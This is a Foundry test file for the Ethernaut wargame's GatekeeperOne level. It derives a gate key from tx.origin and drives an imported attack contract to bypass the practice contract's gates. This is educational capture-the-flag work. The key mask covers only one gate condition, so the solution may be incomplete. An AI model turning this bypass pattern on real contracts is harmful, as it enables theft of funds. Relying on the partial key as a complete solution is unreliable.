// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

// testing functionalities
import "forge-std/Test.sol";

// Ethernaut game components
import "src/core/Ethernaut.sol";
import "src/levels/13-GatekeeperOne/GatekeeperOneFactory.sol";
import "src/levels/13-GatekeeperOne/GatekeeperOneAttack.sol";

contract GatekeeperOneTest is Test {
    /*//////////////////////////////////////////////////////////////
                            GAME INSTANCE SETUP
    //////////////////////////////////////////////////////////////*/

    Ethernaut ethernaut;

    /// @dev eve is the attacker
    address eve = makeNameForAddress("eve");

    function setUp() public {
        emit log_string("Setting up GatekeeperOne level...");
        ethernaut = new Ethernaut();
    }

    /*//////////////////////////////////////////////////////////////
                LEVEL INSTANCE -> EXPLOIT -> SUBMISSION
    //////////////////////////////////////////////////////////////*/

    function test_GatekeeperOneExploit() public {
        /*//////////////////////////////////////////////////////////////
                            LEVEL INSTANCE SETUP
        //////////////////////////////////////////////////////////////*/

        GatekeeperOneFactory gatekeeperOneFactory = new GatekeeperOneFactory();

        ethernaut.registerLevel(gatekeeperOneFactory);

        // THIS IS IMPORTANT
        // START PRANK WITH TX.ORIGIN OR CHANGE IT IN FOUNDRY.TOML

        vm.startPrank(tx.origin);
        address levelAddress = ethernaut.createLevelInstance(
            gatekeeperOneFactory
        );

        GatekeeperOne gatekeeperOneContract = GatekeeperOne(levelAddress);

        emit log_string("Starting the exploit... 🧨");
        emit log_named_address("Eve's address", eve);
        emit log_named_address("Ethernaut's address", address(ethernaut));
        emit log_named_address(
            "Factory's address",
            address(gatekeeperOneFactory)
        );
        emit log_named_address(
            "Instance's address",
            address(gatekeeperOneContract)
        );
        // it turns out that there is a default value for tx.origin
        // set up by Foundry
        // 0x00a329c0648769a73afac7f9381e08fb43dbea72
        // this is the reason why this script was not working for Eve
        // she is not the tx.origin
        // Test contract is
        // startPrank sets msg.sender not tx.origin
        // it is possible to set tx.origin tho, but its buggy as hell
        emit log_named_address("This is tx.origin: ", tx.origin);

        /*//////////////////////////////////////////////////////////////
                                LEVEL EXPLOIT
        //////////////////////////////////////////////////////////////*/

        GatekeeperOneAttack gatekeeperOneAttack = new GatekeeperOneAttack(
            address(gatekeeperOneContract)
        );

        // GATE 3 condition 1
        bytes8 gateKeyPartOne = bytes8(uint64(uint160(tx.origin))) &
            0x000000000000FFFF;
        emit log_named_uint(
            "part one - uint32: ",
            uint32(uint64(gateKeyPartOne))
        );
        emit log_named_uint(
            "part one - uint16: ",
            uint16(uint64(gateKeyPartOne))
        );

        bytes8 gateKey = bytes8(uint64(uint160(tx.origin))) &
            0x000000000000FFFF;

        gatekeeperOneAttack.attack(gateKey);
        /*//////////////////////////////////////////////////////////////
                                LEVEL SUBMISSION
        //////////////////////////////////////////////////////////////*/

        bool challengeCompleted = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(challengeCompleted);
    }

    /*//////////////////////////////////////////////////////////////
                            HELPER FUNCTIONS
    //////////////////////////////////////////////////////////////*/

    /**
     * I've found this useful function
     * in github/twpony Ethernaut repo
     * @notice This function allows for creating labels (names) for addresses
     * which will improve readability in traces
     * @param name you pass the name like "alice" or "bob" and it will create
     * an address for that person
     */
    function makeNameForAddress(string memory name) public returns (address) {
        address addr = address(
            uint160(uint256(keccak256(abi.encodePacked(name))))
        );
        vm.label(addr, name);
        return addr;
    }
}
